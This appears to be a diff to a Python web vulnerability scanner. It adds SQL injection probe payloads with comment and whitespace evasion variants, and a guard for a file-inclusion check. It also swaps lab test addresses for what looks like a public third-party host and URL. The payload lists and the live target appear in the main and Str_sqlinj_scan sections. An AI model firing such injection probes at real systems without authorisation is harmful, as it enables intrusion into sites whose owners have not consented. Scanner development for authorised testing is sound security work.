@@ -43,6 +43,7 @@ class vul_module(threading.Thread):
 		self.logfile = logfile
 
 	def Integer_sqlinj_scan(self):
+
 		try:
 			res_md5_1 = md5_encrypt(requests.get(url=self.url,headers=HEADER).text)
 			res_md5_2 = md5_encrypt(requests.get(url=self.url+urlencode('+1'),headers=HEADER).text)
@@ -58,19 +59,24 @@ class vul_module(threading.Thread):
 
 								
 	def Str_sqlinj_scan(self):
-		quotes = ['\'' , '"']
+		quotes = ['\'' , '"','']
+		payload_0 = [" and 0;-- ","/**/and/**/0;#","\tand\t0;#","\nand/**/0;#"]
+		payload_1 = [" and 1;-- ","/**/and/**/1;#","\tand\t1;#","\nand/**/1;#"]
 
 		for i in quotes:
-			try:
-				res_md5_1 = md5_encrypt(requests.get(url=self.url,headers=HEADER).text)
-				res_md5_2 = md5_encrypt(requests.get(url=self.url+urlencode(i+' and 0;-- '),headers=HEADER).text)
-				res_md5_3 = md5_encrypt(requests.get(url=self.url+urlencode(i+' and 1;-- '),headers=HEADER).text)
-			except Exception,e:
-				print e
-				res_md5_1 = res_md5_2 = res_md5_3 = 0
-				pass
-			if ( res_md5_1 == res_md5_3 ) and res_md5_1 != res_md5_2:
-				return 1
+			for j in range(len(payload_0)):
+				p0 = i + payload_0[j]
+				p1 = i + payload_1[j]
+				try:
+					res_md5_1 = md5_encrypt(requests.get(url=self.url,headers=HEADER).text)
+					res_md5_2 = md5_encrypt(requests.get(url=self.url+urlencode(p0),headers=HEADER).text)
+					res_md5_3 = md5_encrypt(requests.get(url=self.url+urlencode(p1),headers=HEADER).text)
+				except Exception,e:
+					print e
+					res_md5_1 = res_md5_2 = res_md5_3 = 0
+					pass
+				if ( res_md5_1 == res_md5_3 ) and res_md5_1 != res_md5_2:
+					return 1
 		return 0
 
 	def Sql_error_scan(self):
@@ -127,6 +133,8 @@ class vul_module(threading.Thread):
 		url = urlparse.urlparse(self.url)
 		url_query = url.query
 		url_query_tmp = []
+		if not url_query:
+			return 0
 		for i in url_query.split('&'):
 			i_tmp = i.replace(i.split('=')[1],RFI_PAYLOAD[0])
 			url_query_tmp = url_query
@@ -313,6 +321,53 @@ class vul_module(threading.Thread):
 			self.logfile.flush()
 
 if __name__ == '__main__':
-	url = "http://192.168.87.143/fileincl/example1.php?page=12"
-	self = vul_module(url)
+	
+	logfile = open('logfile.txt','a')
+	
+
+	url = "http://121.41.128.239:8098/stkj/index.php/product/safety_wire?t=7"
+	self = vul_module(url,logfile)
 	self.start()
+
+	'''
+	url = "http://192.168.8.131/sqli/example1.php?name=root"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example2.php?name=root"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example3.php?name=root"
+	self = vul_module(url,logfile)
+	self.start()
+
+	
+	url = "http://192.168.8.131/sqli/example4.php?id=2"
+	self = vul_module(url,logfile)
+	self.start()
+
+	
+
+	url = "http://192.168.8.131/sqli/example5.php?id=2"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example6.php?id=2"
+	self = vul_module(url,logfile)
+	self.start()
+
+	
+
+	url = "http://192.168.8.131/sqli/example7.php?id=2"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example8.php?order=name"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example9.php?order=name"
+	self = vul_module(url,logfile)
+	self.start()
+	'''
